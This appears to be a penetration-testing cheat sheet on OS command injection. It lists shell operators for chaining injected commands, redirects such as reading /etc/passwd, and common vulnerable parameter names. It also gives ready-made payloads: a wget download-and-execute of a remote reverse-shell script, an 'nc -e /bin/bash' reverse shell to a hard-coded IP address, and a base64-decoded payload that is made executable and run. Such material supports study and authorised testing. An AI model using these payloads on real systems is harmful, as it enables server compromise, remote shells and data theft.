# Command Injection

### What is command Injection?

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute an arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. (From [here](https://portswigger.net/web-security/os-command-injection)).

#### Context

Depending on **where your input is being injected** you may need to **terminate the quoted context** (using `"` or `'`) before the commands.

### Command Injection/Execution

## Both Unix and Windows supported

```bash
ls||id; ls ||id; ls|| id; ls || id # Execute both

ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)

ls&&id; ls &&id; ls&& id; ls && id # Execute 2º if 1º finish ok

ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º

ls %0A id # %0A Execute both (RECOMMENDED)
```

## Only unix supported

```bash
`ls` # ``

$(ls) # $()

ls; id # ; Chain commands

ls${LS_COLORS:10:1}${IFS}id # Might be useful

```

## Not executed but may be interesting

```bash
> /var/www/html/out.txt #Try to redirect the output to a file

< /etc/passwd #Try to send some input to the command
```

#### **Limition** Bypasses

If you are trying to execute **arbitrary commands inside a linux machine** you will be interested to read about this **Bypasses:**

#### **Examples**

```bash
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php

vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80

vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```

#### Parameters

Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities (from [link](https://twitter.com/trbughunters/status/1283133356922884096)):

```bash
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

* [ ] [**Blind OS command injection with time delays**](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
* [ ] [**Blind OS command injection with output redirection**](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
* [ ] [**Blind OS command injection with out-of-band interaction**](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
* [ ] [**Blind OS command injection with out-of-band data exfiltration**](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
